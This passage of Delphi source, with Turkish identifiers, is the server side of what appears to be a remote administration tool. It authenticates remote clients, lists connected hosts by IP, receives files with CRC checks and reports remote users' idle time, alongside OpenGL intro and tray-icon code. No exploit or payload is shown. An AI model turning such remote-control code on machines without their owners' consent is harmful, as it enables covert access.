      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
 glEnd();
end;

procedure tform1.sonsahne;
var
angile:glfloat;
begin
angile :=(LastTime + ElapsedTIme)/6500  - 2.2;   // provides smoother movement
LastTime := ElapsedTime;

if angile > 9.4 then begin
animson:=true;
glTranslate(0.04, -0.7, -5.5);
glColor4f(1,1,1,1);
    glBindTexture(GL_TEXTURE_2D, cr5tex);
    glBegin(GL_QUADS);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
 glEnd();
 alayibitti:=true;
end;
end;

procedure TForm1.glDraw();
begin
glClear(GL_COLOR_BUFFER_BIT or GL_DEPTH_BUFFER_BIT);    // Clear The Screen And The Depth Buffer
glLoadIdentity();                                       // Reset The View

  glPushAttrib(GL_DEPTH_TEST);  // Save the current Depth test settings (Used for blending )
  glPushMatrix();
  glDisable(GL_BLEND);
  glTranslatef(0.0,0.01,-3);
  glscalef(1,0.9,1);
  glCOlor3f(0.1, 0.2, 0.1);
  glBindTexture(GL_TEXTURE_2D, Arkaplan);
      glBegin(GL_QUADS);
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
glend;
glenable(GL_BLEND);
glpopmatrix;
glpopattrib;

glPushAttrib(GL_DEPTH_TEST);  // Save the current Depth test settings (Used for blending )
glpushmatrix;
case elapsedtime of
0..2100 : ekran1;
2101..4250 : ekran2;
4251..46000 : ekran3;
end;
glpopmatrix;
glpopattrib;

if elapsedtime > 4255 then sonsahne;
end;

procedure tform1.varsayilanlar;
begin
flatcheckbox1.Checked:=True;
flatcheckbox5.Checked:=false;
flatcheckbox14.Checked:=false;
flatcheckbox7.Checked:=True;
flatcheckbox11.Checked:=True;
flatcheckbox13.Checked:=True;
flatcheckbox21.Checked:=True;
flatcheckbox10.Checked:=True;
flatcheckbox2.Checked:=False;
flatcheckbox4.Checked:=true;
flatcheckbox3.Checked:=false;
deletefile(extractfilepath(paramstr(0))+'\'+ayardosyasi);
deletefile(extractfilepath(paramstr(0))+'\'+ayardosyasi+'_');
end;

procedure ayaroku;
var
SomeTxtFile : TextFile;
buffer,kutular,prt,gerisi,obirkisi : string;
hoo,foo,doo : integer;
label
sizkacinbenonlarioyalarim,
vazgectimkacmayinlagn;
begin

if fileexists(extractfilepath(application.exename)+ayardosyasi) then begin
try
ayar:=tstringlist.create;
kayar:=tstringlist.create;
dayar:=tstringlist.create;
lhac(extractfilepath(application.exename)+ayardosyasi,extractfilepath(application.exename)+ayardosyasi+'_');
AssignFile(SomeTxtFile,extractfilepath(application.exename)+ayardosyasi+'_');
Reset(SomeTxtFile) ;
while not EOF(SomeTxtFile) do begin
ReadLn(SomeTxtFile, buffer);
kayar.Add(buffer);
end;
CloseFile(SomeTxtFile);
deletefile(extractfilepath(application.exename)+ayardosyasi+'_');
kutular:=decode64(kayar.strings[0]);

for hoo:=0 to 15 do begin
ayar.Add(parcala(kutular,hoo));
end;

if ayar.Strings[0]='X' then form1.flatcheckbox1.Checked:=true;
if ayar.Strings[1]='X' then form1.flatcheckbox5.Checked:=true;
if ayar.Strings[2]='X' then form1.flatcheckbox14.Checked:=true;
if ayar.Strings[3]='X' then form1.flatcheckbox7.Checked:=true;
if ayar.Strings[4]='X' then form1.flatcheckbox11.Checked:=true;
if ayar.Strings[5]='X' then form1.flatcheckbox13.Checked:=true;
if ayar.Strings[6]='X' then form1.flatcheckbox21.Checked:=true;
if ayar.Strings[7]='X' then form1.flatcheckbox10.Checked:=true;
if ayar.Strings[8]='X' then form1.flatcheckbox2.Checked:=true;
if ayar.Strings[9]='X' then form1.flatcheckbox4.Checked:=true;
if ayar.Strings[10]='X' then form1.flatcheckbox6.Checked:=true;
if ayar.Strings[11]='X' then form1.flatcheckbox9.Checked:=true;
if ayar.Strings[12]='X' then form1.flatcheckbox15.Checked:=true;
if ayar.Strings[13]='X' then form1.flatcheckbox18.Checked:=true;
if ayar.Strings[14]='X' then form1.flatcheckbox3.Checked:=true;
if ayar.Strings[15]='E' then begin
form1.flatradiobutton8.Checked:=True;
form1.enuygula:=True;
end;

prt:=decode64(kayar.strings[1]);
if prt='YOK' then goto sizkacinbenonlarioyalarim;

foo:=strtoint(parcala(prt,0));
delete(prt,1,pos('|',prt));

for doo:=0 to foo do begin
if parcala(prt,doo)='' then break;
form1.FlatListBox1.Items.Add(parcala(prt,doo));
end;

sizkacinbenonlarioyalarim:
gerisi:=decode64(kayar.strings[2]);
if gerisi='BUDAYOK' then goto vazgectimkacmayinlagn;
form1.FlatEdit6.text:=parcala(gerisi,0);
form1.FlatEdit1.text:=parcala(gerisi,1);
vazgectimkacmayinlagn:
obirkisi:=decode64(kayar.strings[3]);
form1.FlatEdit3.Text:=parcala(obirkisi,0);
form1.FlatEdit8.Text:=parcala(obirkisi,1);
form1.FlatEdit4.Text:=parcala(obirkisi,2);
form1.FlatEdit5.Text:=parcala(obirkisi,3);
except on exception do form1.varsayilanlar;
end;
end;
end;

procedure tform1.baspanelecekvurbeni;
begin
if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;

flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=cllime;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=cllime;
flatbutton39.colorborder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clgreen;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;
flatbutton39.Colorfocused:=clgreen;
memo1.Visible:=false;
listview1.Visible:=false;
panel14.Visible:=False;
panel15.Visible:=False;
panel1.Visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=false;
flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;
panel15.visible:=true;
end;

procedure Delay(MSecs: Integer);
  var
    FirstTickCount: LongInt;
  begin
    FirstTickCount := GetTickCount;
    repeat
     Application.ProcessMessages
    until ((GetTickCount - FirstTickCount) >= Longint(MSecs));
end;

procedure tform1.konsolabasargibi;
begin
if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;
flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=cllime;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clgreen;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;
flatbutton39.Colorfocused:=clmaroon;
flatbutton39.ColorBorder:=clmaroon;
listview1.Visible:=false;
panel14.Visible:=False;
panel15.Visible:=False;
panel1.Visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=false;

memo1.visible:=true;
flatbutton25.visible:=true;
flatbutton7.visible:=true;
flatbutton2.visible:=true;
flatedit2.visible:=true;
end;

procedure TForm1.balonhedesi(baslik,yazi:string;tur:integer);
begin
  IconData.cbSize := SizeOf(IconData);
  IconData.uFlags := NIF_INFO;
  strPLCopy(IconData.szInfo, yazi, SizeOf(IconData.szInfo) - 1);
  IconData.DUMMYUNIONNAME.uTimeout := 3000;
  strPLCopy(IconData.szInfoTitle, baslik, SizeOf(IconData.szInfoTitle) - 1);
  if tur=0 then IconData.dwInfoFlags := NIIF_INFO;     //NIIF_ERROR;  //NIIF_WARNING;
  if tur=1 then IconData.dwInfoFlags := NIIF_ERROR;     //;  //;
  if tur=2 then IconData.dwInfoFlags := NIIF_WARNING;     //NIIF_ERROR;  //NIIF_WARNING;
  Shell_NotifyIcon(NIM_MODIFY, @IconData);
  {in my testing, the following code has no use}
  IconData.DUMMYUNIONNAME.uVersion := NOTIFYICON_VERSION;
  Shell_NotifyIcon(NIM_SETVERSION, @IconData)
end;

procedure TForm1.DeleteSysTrayIcon;
begin
DeallocateHWnd(IconData.Wnd);
Shell_NotifyIcon(NIM_DELETE, @IconData);
end;

procedure TForm1.AddSysTrayIcon;
begin
  IconData.cbSize := SizeOf(IconData);
  IconData.Wnd := AllocateHWnd(SysTrayIconMsgHandler);
  {SysTrayIconMsgHandler is then callback message' handler}
  IconData.uID := 0;
  IconData.uFlags := NIF_ICON or NIF_MESSAGE or NIF_TIP;
  IconData.uCallbackMessage := TRAY_CALLBACK;   //user defined callback message
  IconData.hIcon := Application.Icon.Handle;    //an Icon's Handle
  IconData.szTip := baslik;
  Shell_NotifyIcon(NIM_ADD, @IconData);
end;

procedure TForm1.SysTrayIconMsgHandler(var Msg: TMessage);
begin
  case Msg.lParam of
    WM_MOUSEMOVE:;
    WM_LBUTTONDOWN:;
    WM_LBUTTONUP:;
    WM_LBUTTONDBLCLK:
    begin
    form1.Show;
    SetForegroundWindow(form1.Handle);
    SendMessage(form1.Handle, WM_SYSCOMMAND, SC_RESTORE, form1.Handle);
    end;
    WM_RBUTTONDOWN:;
    WM_RBUTTONUP:popupmenu3.Popup(mouse.CursorPos.X,mouse.CursorPos.Y);
    WM_RBUTTONDBLCLK:;
    //followed by the new messages
    NIN_BALLOONSHOW:;
    NIN_BALLOONHIDE:;
    NIN_BALLOONTIMEOUT:;
    NIN_BALLOONUSERCLICK:
    begin
    form1.Show;
    SetForegroundWindow(form1.Handle);
    SendMessage(form1.Handle, WM_SYSCOMMAND, SC_RESTORE, form1.Handle);
   end;
  end;
end;

function tform1.onayla(konu:string) : Boolean;
var
h:integer;
begin
result:=false;
h:=messagebox(getforegroundwindow,pchar(konu),pchar(cmesaj[169]),$00000020 or $00000001);
if h=1 then result:=true;
end;

procedure butonkapa;
begin
form1.konsolabasargibi;
form1.FlatButton33.Enabled:=false;
form1.FlatButton4.Enabled:=false;
form1.FlatButton5.Enabled:=false;
form1.FlatButton36.Enabled:=false;
form1.FlatButton18.Enabled:=false;
form1.FlatButton43.Enabled:=false;
form1.FlatButton27.Enabled:=false;
form1.FlatButton42.Enabled:=false;
form1.FlatButton17.Enabled:=false;
form1.TrackBar1.Enabled:=false;

form1.FlatButton3.Enabled:=false;
form1.FlatButton6.Enabled:=false;

form1.FlatButton16.Enabled:=false;
form1.FlatButton1.Enabled:=false;
form1.FlatButton15.Enabled:=false;
form1.FlatButton12.Enabled:=false;
form1.FlatButton13.Enabled:=false;
form1.FlatButton19.Enabled:=false;
form1.FlatButton14.Enabled:=false;
form1.FlatButton50.Enabled:=false;
form1.FlatButton54.Enabled:=false;

form1.Panel12.Visible:=true;
form1.Label3.Caption:='---';
form1.gauge2.Progress:=0;
form1.Gauge2.ForeColor:=clgreen;
form1.FlatButton47.Enabled:=false;
form1.FlatEdit9.Text:='0';

form1.flatbutton12.ColorBorder:=cllime;
form1.flatbutton13.ColorBorder:=cllime;
form1.flatbutton14.ColorBorder:=cllime;
form1.flatbutton19.ColorBorder:=cllime;

form1.flatbutton12.Colorfocused:=clgreen;
form1.flatbutton13.Colorfocused:=clgreen;
form1.flatbutton14.Colorfocused:=clgreen;
form1.flatbutton19.Colorfocused:=clgreen;
butonkapali:=true;
end;

procedure butonac;
begin
form1.FlatButton47.Enabled:=true;
form1.FlatButton33.Enabled:=true;
form1.FlatButton4.Enabled:=true;
form1.FlatButton5.Enabled:=true;
form1.FlatButton36.Enabled:=true;
form1.FlatButton18.Enabled:=true;
form1.FlatButton43.Enabled:=true;
form1.FlatButton27.Enabled:=true;
form1.FlatButton42.Enabled:=true;
form1.FlatButton17.Enabled:=true;
form1.TrackBar1.Enabled:=true;

form1.FlatButton3.Enabled:=true;
form1.FlatButton6.Enabled:=true;

form1.FlatButton16.Enabled:=true;
form1.FlatButton1.Enabled:=true;
form1.FlatButton15.Enabled:=true;
form1.FlatButton12.Enabled:=true;
form1.FlatButton13.Enabled:=true;
form1.FlatButton19.Enabled:=true;
form1.FlatButton14.Enabled:=true;
form1.FlatButton50.Enabled:=true;
form1.FlatButton54.Enabled:=true;
butonkapali:=false;
end;

procedure kullanicigirisi(soket:integer;ip:string;port:string;kimliq:string);
var
listitem: Tlistitem;
begin
ListItem := form1.ListView1.Items.Add;
listitem.Caption:=inttostr(soket);
listitem.SubItems.Add(ip);
listitem.SubItems.Add(port);
listitem.SubItems.Add(kimliq);
end;

procedure desteklebeni;
begin
form1.clientsocket1.Active:=false;
destek.aktif:=true;
if form1.flatradiobutton1.Checked then form1.ClientSocket1.Active:=true;
if form1.FlatRadioButton2.Checked then destek.ip:=form1.ServerSocket1.Socket.LocalHost;
destek.kullanici:=fkullanici;
destek.sifre:=fsifre;
end;

Procedure TForm1.yenile;
var
i,tekrarsec : integer;
begin
tekrarsec:=listview1.ItemIndex;
listview1.Clear;
for i := 0 To ServerSocket1.Socket.ActiveConnections -1 do
begin
kullanicigirisi(serversocket1.Socket.Connections[i].SocketHandle,ServerSocket1.Socket.Connections[i].RemoteAddress,'-','-');
serversocket1.Socket.Connections[i].SendText('+YN'+inttostr(serversocket1.Socket.Connections[i].SocketHandle));
end;
listview1.ItemIndex:=tekrarsec;
end;

procedure TForm1.ServerSocket1Accept(Sender: TObject;Socket: TCustomWinSocket);
begin
label14.Font.Color:=cllime;
label14.caption:=cmesaj[0]+Socket.RemoteAddress;
end;

function CustomSortProc(Item1, Item2: TListItem; ParamSort: integer): integer; stdcall;
begin
Result := CompareText(extractfileext(Item1.Caption),extractfileext(Item2.Caption));
end;

procedure bilgi(mesaj:string;tur:integer);
var
str:string;
begin
saat:=timetostr(time);
case tur of
1: str:='['+saat+']: ';
2: str:='[ UYARI ]: ';
3: str:='[ HATA ]: ';
end;

form1.Memo1.Lines.Add(str+mesaj);
if not form1.memo1.Visible then form1.parla1.Enabled:=true;
end;

procedure logsakla;
var
dosya:string;
var  F:Textfile;
begin
randomize;

 try
dosya:=extractfilepath(paramstr(0))+'log\'+datetostr(date)+'.txt';
Assignfile(F,dosya);
if not FileExists(dosya) Then begin
Rewrite(F);
Closefile(F);
End
Else
Assignfile(F,dosya);
{$I-}
Append(F);
{$I+}
If IOResult<> 0 Then
Begin
bilgi('G�nl�k Kaydedilemedi..',2);
End;
Write(F,form1.Memo1.Text);
Closefile(F);

except on exception do exit
end;
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
cevap,stt,parca1,dsaglama: string;
islemsayisi,listele: integer;
ii,hh,zz,kk,tt,xx,yy,g1,g2,dt,x2,DB,db2,lag,tpaket,gpaket,ksayisi,ssayisi,dsayisi,hdd,pnc: integer;
ListItem: TListItem;
MsgLen,LenReceived : integer;
label
yorumla,
bura,
bura2,
bura3,
bura4,
katla,
datla,
SON;

begin
dsayisi:=0;
DateTime := Time;
saat := TimeToStr(dateTime);
MsgLen := Socket.ReceiveLength;
while MsgLen > 0 do begin
SetLength(cevap,MsgLen);
LenReceived := Socket.ReceiveBuf(cevap[1], MsgLen );
cevap:= Copy(cevap,1,LenReceived);
MsgLen := Socket.ReceiveLength;
end;

if length(cevap) > 4100 then begin
bilgi('Packet too large',3);
goto son;
end;

If copy(cevap, pos(#13, cevap)+1, length(cevap)) <> '' then Begin

if copy(cevap,1,8) = '+dogrula' then begin
delete(cevap,1,9);
if parcala(cevap,0) = md5sakla then begin
label3.Left:=gauge2.Left+gauge2.Width div 2 - 20;
label3.Caption:=cmesaj[1];
end
else label3.Caption:=cmesaj[2];
goto son;
end;

if cevap = '+phata' then begin
gauge2.ForeColor:=clmaroon;
label3.Left:=gauge2.Left+gauge2.Width div 2 - 25;
label3.Caption:=cmesaj[3];
if form2.Visible then form2.StatusBar1.Panels[2].Text:=cmesaj[3];
pcevap:='';
goto son;
end;

if cevap = '+piptal' then begin
gauge2.ForeColor:=clmaroon;
label3.Left:=gauge2.Left+gauge2.Width div 2 - 15;
label3.Caption:=cmesaj[4];
if form2.Visible then form2.StatusBar1.Panels[2].Text:='';
pcevap:='';
goto son;
end;

if copy (cevap,1,7)='+pkomut' then begin
delete(cevap, 1, 8);
gpaket:=strtoint(copy(cevap,1,pos('/',cevap)-1));
delete(cevap,1,pos('/',cevap));
tpaket:=strtoint(copy(cevap,1,pos(']',cevap)-1));
delete(cevap,1,pos(']',cevap));
if gpaket=0 then begin
pcevap:='';
gauge2.Progress:=gauge2.MinValue;
end;
pcevap:=pcevap+cevap;
sleep(1);
gauge2.ForeColor:=clgreen;
gauge2.MaxValue:=tpaket;
gauge2.Progress:=gpaket;
label3.Left:=gauge2.Left+gauge2.Width div 2 - 40;
if form2.Visible then form2.StatusBar1.Panels[2].Text:=cmesaj[5]+'['+inttostr(gpaket)+'/'+inttostr(tpaket)+']';
label3.Caption:=cmesaj[5]+'['+inttostr(gpaket)+'/'+inttostr(tpaket)+']';
if gpaket=tpaket then begin
if form2.Visible then form2.StatusBar1.Panels[2].Text:='';
label3.Left:=gauge2.Left+gauge2.Width div 2 - 13;
label3.Caption:=cmesaj[6];
cevap:=pcevap;
md5sakla:=strmd5(cevap);
pcevap:='';
socket.SendText('+sonraki');
goto YORUMLA;
end;

socket.SendText('+sonraki');
goto son;
end;

// burdan yukar� komut yazma ! ! !

yorumla:

if copy(cevap,1,7) = '<TAMAM>' Then begin
label14.font.Color:=cllime;
butonac;
label14.Caption:=cmesaj[7];
goto son;
end;

if copy(cevap,1,5) = '<BEN>' then begin
delete(cevap,1,5);
cevap:=copy(cevap,1,pos('</BEN>',cevap)-1);
cevap:=decode64(cevap);
if parcala(cevap,2) = strmd5(flatedit1.Text) then begin
if flatcheckbox7.Checked then begin
msnpopup1.Text:=Parcala(cevap,0)+' / '+parcala(cevap,1)+ent+'['+socket.RemoteAddress+']';
if flatcheckbox11.checked then PlayWavFile('EFEKT5');
msnpopup1.ShowPopUp;
end;
bilgi(cmesaj[8]+parcala(cevap,0)+cmesaj[9]+parcala(cevap,1),1);
yetkili[socket.SocketHandle]:=true;
kullanicigirisi(socket.SocketHandle,socket.RemoteAddress,parcala(cevap,3),Parcala(cevap,0)+'/'+parcala(cevap,1));
bagnanan:=bagnanan+1;
socket.sendtext('<SEN>'+encode64(fkullanici+'|'+fsifre+'|'+flatedit21.Text+'|'+flatedit22.Text+'|'+flatedit23.Text+'|'+flatedit1.Text)+'</SEN>');
end
else begin
label14.Caption:=cmesaj[10]+'('+socket.RemoteAddress+')';
socket.Destroy;
end;
goto son;
end;

if not yetkili[socket.SocketHandle] then exit;

if copy(cevap,1,4) = '+CRC' Then begin
delete(cevap,1,5);
dsaglama:=inttostr(computefilecrc32(extractfilepath(paramstr(0))+'download\'+parcala(cevap,0)));
if dsaglama=parcala(cevap,1) then goto son;
if flatcheckbox11.checked then PlayWavFile('efekt6');
bilgi(cmesaj[11]+parcala(cevap,0),1);
goto son;
end;

if copy(cevap,1,4) = '+XRC' Then begin
delete(cevap,1,5);
dsaglama:=inttostr(computefilecrc32(parcala(cevap,0)));
if dsaglama=parcala(cevap,1) then goto son;
if flatcheckbox11.checked then PlayWavFile('efekt6');
bilgi(cmesaj[11]+parcala(cevap,0),1);
goto son;
end;

if copy(cevap,1,4) = '+YNL' Then begin
delete(cevap,1,4);
for listele:=0 to listview1.items.count - 1 do begin
if parcala(cevap,0)=listview1.Items[listele].Caption then begin
listview1.Items[listele].SubItems.Strings[1]:=parcala(cevap,2);
listview1.Items[listele].SubItems.Strings[2]:=parcala(cevap,1);
end;
end;
goto son;
end;

if copy(cevap,1,6) = '+!IDL!' then begin
delete(cevap,1,7);
if flatcheckbox7.Checked then balonhedesi(parcala(cevap,0)+cmesaj[9]+parcala(cevap,1),cmesaj[13],0);
bilgi(cmesaj[12]+' : '+parcala(cevap,0)+cmesaj[9]+parcala(cevap,1),1);
goto son;
end;

if copy(cevap,1,4) = '+mmk' then begin
delete(cevap,1,5);
cevap:=parcala(cevap,0);
if not directoryexists(extractfilepath(paramstr(0))+'Download\'+copy(cevap,1,pos('\',cevap)-1)) then mkdir(extractfilepath(paramstr(0))+'Download\'+copy(cevap,1,pos('\',cevap)-1));
mkdir(extractfilepath(paramstr(0))+'Download\'+cevap);
goto son;
end;

if copy(cevap,1,3) = '+BD' then begin
delete(cevap,1,3);
if not form3.visible then form3.Visible:=true;
form3.label14.Caption:=parcala(cevap,0);
goto son;
end;

if copy (cevap,1,3) = '+UI' then begin
delete(cevap,1,3);
cevap:=parcala(cevap,0);
label14.Font.Color:=cllime;
label14.Caption:='idle : '+hesapla(strtoint(cevap));
goto son;
end;

if copy (cevap, 1, 3)='+ID' then begin
label14.Font.Color:=cllime;
label14.Caption:=cmesaj[14]+parcala(cevap,1)+'/'+parcala(cevap,2)+cmesaj[9]+parcala(cevap,3);
goto son;
end;

if copy (cevap,1,6)='+uyari' then begin
delete(cevap, 1, 6);
try
case strtoint(copy(cevap,1,2)) of
01: bilgi(cmesaj[15],2);
02: bilgi(cmesaj[15],2);
03: bilgi(cmesaj[15],2);
04: bilgi(cmesaj[15],2);
05: bilgi(cmesaj[16],1);
06: bilgi(cmesaj[15],2);
end;
except on exception do exit;
end;
goto son;
end;


if copy (cevap,1,6)='+yanit' then begin
delete(cevap,1,6);
cevap:=parcala(cevap,0);
label14.Font.Color:=cllime;

if copy(cevap,1,2) = '01' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[17];
goto son;
end;
if pos(fkullanici,cevap) > 0 then cevap:=copy(cevap,1,pos(fkullanici,cevap)-2);
label14.Caption:=cmesaj[18]+cevap;
goto son;
end;

if copy(cevap,1,2) = '02' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[19];
goto son;
end;
label14.Caption:=cmesaj[20];
goto son;
end;

if copy(cevap,1,2) = '03' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[21]+cevap;
goto son;
end;
label14.Caption:=cmesaj[21]+cevap;
goto son;
end;

if copy(cevap,1,2) = '04' then begin
delete(cevap, 1, 3);
if form2.Active then form2.StatusBar1.Panels[2].Text:=cmesaj[23];
if pos(fkullanici,cevap) > 0 then cevap:=copy(cevap,1,pos(fkullanici,cevap)-2);
bilgi(cmesaj[22]+cevap,1);
label14.Caption:='';
if flatcheckbox11.checked then PlayWavFile('efekt6');
goto son;
end;

if copy(cevap,1,2) = '05' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[24]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[24]+cevap;
goto son;
end;

if copy(cevap,1,2) = '06' then begin
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[19];
goto son;
end;
label14.Caption:=cmesaj[19];
goto son;
end;

if copy(cevap,1,2) = '07' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[21]+cevap;
goto son;
end;
label14.Caption:=cmesaj[21];
goto son;
end;

  //as�ddddddddddddjhasd

if copy(cevap,1,2) = '08' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[25]+cevap;
goto son;
end;
label14.Caption:=cmesaj[25]+cevap;
goto son;
end;

if copy(cevap,1,2) = '09' then begin
delete(cevap, 1, 3);
if flatcheckbox7.Checked then balonhedesi(cmesaj[26],cevap,0);
if form2.Active then begin
form2.StatusBar1.Panels[2].Text:=cmesaj[27]+cevap;
goto son;
end;
label14.Caption:=cmesaj[27]+cevap;
goto son;
end;

// ajdlk�as�jdkljlaksjdklas

if copy(cevap,1,2) = '10' then begin
bilgi(cmesaj[28],1);
goto son;
end;

if copy(cevap,1,2) = '11' then begin
bilgi(cmesaj[29],1);
goto son;
end;

if copy(cevap,1,2) = '12' then begin
bilgi(cmesaj[30]+socket.RemoteAddress,1);
goto son;
end;

if copy(cevap,1,2) = '13' then begin
bilgi(cmesaj[31]+socket.RemoteAddress,1);
goto son;
end;

if copy(cevap,1,2) = '14' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[32]+cevap;
goto son;
end;
label14.Caption:=cmesaj[33]+cevap;
goto son;
end;

if copy(cevap,1,2) = '15' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[34]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[35]+cevap;
goto son;
end;

if copy(cevap,1,2) = '16' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[36]+cevap;
goto son;
end;
label14.Caption:=cmesaj[36]+cevap;
goto son;
end;

if copy(cevap,1,2) = '17' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[37]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[37]+cevap;
goto son;
end;

if copy(cevap,1,2) = '18' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[38]+cevap;
goto son;
end;
label14.Caption:=cmesaj[38]+cevap;
goto son;
end;

if copy(cevap,1,2) = '19' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[39]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[39]+cevap;
goto son;
end;

if copy(cevap,1,2) = '20' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[40]+cevap;
goto son;
end;
label14.Caption:=cmesaj[40]+cevap;
goto son;
end;

if copy(cevap,1,2) = '21' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[41]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[41]+cevap;
goto son;
end;

if copy(cevap,1,2) = '22' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[42]+cevap;
goto son;
end;
label14.Caption:=cmesaj[42]+cevap;
goto son;
end;

if copy(cevap,1,2) = '23' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[43]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[43]+cevap;
goto son;
end;

if copy(cevap,1,2) = '24' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[44]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[44]+cevap;
goto son;
end;

if copy(cevap,1,2) = '25' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[45]+cevap;
goto son;
end;

if copy(cevap,1,2) = '26' then begin
delete(cevap, 1, 3);
label14.Font.Color:=clred;
label14.Caption:=cmesaj[46]+cevap;
goto son;
end;

if copy(cevap,1,2) = '27' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[47]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '28' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[48]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '29' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[49]+cevap;
goto son;
end;

if copy(cevap,1,2) = '30' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[50]+cevap;
goto son;
end;

if copy(cevap,1,2) = '31' then begin
delete(cevap, 1, 3);
if flatcheckbox11.checked then PlayWavFile('efekt1');
label14.Caption:=cmesaj[51]+cevap;
goto son;
end;

if copy(cevap,1,2) = '32' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[52];
goto son;
end;

if copy(cevap,1,2) = '33' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[53]+cevap+' Saniye';
goto son;
end;

if copy(cevap,1,2) = '34' then begin
bilgi(cmesaj[54],1);
goto son;
end;

if copy(cevap,1,2) = '35' then begin
bilgi(cmesaj[55],1);
goto son;
end;

if copy(cevap,1,2) = '36' then begin
bilgi(cmesaj[56],1);
goto son;
end;

if copy(cevap,1,2) = '37' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[57]+cevap;
goto son;
end;

if copy(cevap,1,2) = '38' then begin
delete(cevap, 1, 3);
label14.Font.Color:=clred;
label14.Caption:=cmesaj[58]+cevap;
goto son;
end;

if copy(cevap,1,2) = '39' then begin
delete(cevap, 1, 3);
label14.Caption:=cmesaj[59]+cevap;
goto son;
end;

if copy(cevap,1,2) = '40' then begin
delete(cevap, 1, 3);
label14.Font.Color:=clred;
label14.Caption:=cmesaj[60]+cevap;
goto son;
end;

if copy(cevap,1,2) = '41' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[61]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '42' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[62]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '43' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[63],1);
goto son;
end;

